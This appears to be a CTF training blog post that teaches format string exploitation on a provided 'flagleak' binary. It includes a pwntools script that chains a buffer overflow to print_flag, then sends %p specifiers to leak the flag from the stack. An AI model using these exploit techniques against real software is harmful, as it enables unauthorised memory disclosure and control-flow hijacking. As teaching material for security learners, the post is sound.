I"¡-<h3 id="introduction">Introduction:</h3>

<p>This is the 2nd challenge in the in the <a href="https://tourpran.me/categories.html#h-pwn-training">pwn training</a>. In this training we will go through the format string exploitation technique. We are provided 2 challenges of the same vulnerability. Lets go through them one by one.</p>

<h3 id="challenge-1">Challenge 1:</h3>

<p>You can download the binary and the source down below.</p>

<p><a href="/assets/images/pwntraining2/flagleak">vuln binary</a> and 
<a href="/assets/images/pwntraining2/flagleak.c">vuln c code</a></p>

<h3 id="solution">Solution:</h3>

<h4 id="mitigations">Mitigations:</h4>

<p>Lets do the usual drill of checking the mitigations of this binary.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec <span class="nt">--file</span> ./flagleak
</code></pre></div></div>
<p><img src="/assets/images/pwntraining2/pwntrain1.png" alt="" /></p>

<p>RELRO:</p>
<ul>
  <li>Partial RELRO - In the attackers point of view, the GOT (Global Offset Table) is readable and writeable.</li>
</ul>

<p>CANARY:</p>
<ul>
  <li>There is no canary so we can do a buffer overflow.</li>
</ul>

<p>No eXecute:</p>
<ul>
  <li>NX Enabled - this makes sure that the code on the stack is not excecuted.</li>
</ul>

<p>PIE:</p>
<ul>
  <li>No PIE: We know the address of the binary at runtime, Since the binary is not position independent.</li>
</ul>

<h4 id="code-walkthrough">Code walkthrough:</h4>

<p>As said in previous training you can dig in deep into the assembly but to make things simpler we are given the source code. (in most CTF / Real life applications itâ€™ll be helpfull if you know assembly).</p>

<p><img src="/assets/images/pwntraining2/pwntrain2.png" alt="" /></p>

<p>In the main function there is an obvious buffer overflow. Since there is a buffer of size 0x60 but the input is reading 0x60+8+16 (lmao author made is quite obvious). Ok we know the basic buffer overflow pattern right?</p>

<p><img src="/assets/images/pwntraining2/pwntrain3.png" alt="" /></p>

<p>I hope you can come to the <code class="language-plaintext highlighter-rouge">print_flag</code> function by your own. (If you couldnt no probs go <a href="https://tourpran.me/pwn-training/2021/05/09/simple-ret2shellcode-training1.html">here</a> ). Let us now see what is there in the print_flag function.</p>

<p><img src="/assets/images/pwntraining2/pwntrain4.png" alt="" /></p>

<p>It is reading a file called flag.txt. If you dont have the file in your current directory it will give you an error. so create a file with a random value. In this task our main goal is to get the value of the flag. A flag is basically a valuable object in games called ctfs likewise in security contests these flags give you points. Wait does it mean you canâ€™t get a shell in this challenge :( ? Ummâ€¦ You can spawn a shell in this challenge, but in this module we will only try out format string exploitation. If you are too keen to know, then check out what libc leak is. Dont worry we will see them in the later parts of this training.</p>

<h4 id="vulnerability">Vulnerability:</h4>

<p>Before going into the vuln lets see how printf works.</p>

<h4 id="printf">printf:</h4>

<p>printf is a function in the glibc library. It basically has 2 parts, a format and an argument.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"text here and %x %p %s "</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">)</span>
</code></pre></div></div>
<p>So in the first field we fill it with text and format specifiers to print the values in the corresponding second field (variables). The different format specifiers like %x %p %s denote the datatype of the variable; like hex, pointer, string respectively.</p>

<h4 id="exploitation">Exploitation:</h4>
<p>So what if we are able to control the first field. Imagine being able to read more values from 2nd field, more than the available arguments ? Will the program crash ? will it send some garbage data ?</p>

<p>points to note: 
-&gt; The arguments are stored in the stack.
-&gt; printf will take values from the stack.</p>

<p>So, the extra format specifiers we specified will continue to take the values stored in the stack. Lets do it live. [I am using pwntools template. to make a template go to terminal and type <code class="language-plaintext highlighter-rouge">pwn template &gt; xpl.py</code> ]. Now go to vim and continue writing your exploit from the buffer overflow to the print_flag function. (if you are lazy you can copy the script down below :( )</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Set up pwntools for the correct architecture
</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">)</span>
<span class="n">exe</span> <span class="o">=</span> <span class="s">'./flagleak'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"flagleak"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s">'''Start the exploit against the target.'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
b* main
continue
'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span> <span class="c1">#make a connection to the flagleak binary
</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># recv the line given by the binary
</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">b"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401016</span><span class="p">)</span>  <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'print_flag'</span><span class="p">])</span> <span class="p">)</span> <span class="c1"># send a bufferoverflow to the binary to redirect code excecution to print_flag
</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>If you note there, I have added a ret instruction inbetween the print_flag function and rbp. This is to ensure stack alignment issues dont happen.</p>

<p>Ok now set a break point right at the printf function in the print_flag function. To do that change the main to the address of printf. Running your script in vim is very easy.</p>

<div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ESC<span class="p">,</span> <span class="p">:</span><span class="k">w</span> <span class="p">|</span> <span class="p">!.</span>/% GDB NOASLR
</code></pre></div></div>
<p>In the above command we are writing the script with w, running a bash command with ! and excecuting the file ./%. % -&gt; represents the current file. GDB NOASLR -&gt; attachs gdb with ASLR disabled.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">b"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401016</span><span class="p">)</span>  <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'print_flag'</span><span class="p">])</span> <span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>After playing a little bit with gdb and format strings you will know that most of the stuff thats leaked is from the stack. now you can also inspect the stack in gdb pwndbg with <code class="language-plaintext highlighter-rouge">stack 20</code>. Wait a minute!! Do you see there is an address in stack that contains all the contents of our flag file ? Yes when you read and store a file its contents will be stored on the stack.</p>

<p><img src="/assets/images/pwntraining2/pwntrain5.png" alt="" />
Also in the eaked values we can see that our flag address is also leaked.
<img src="/assets/images/pwntraining2/pwntrain5.png" alt="" /></p>
:ET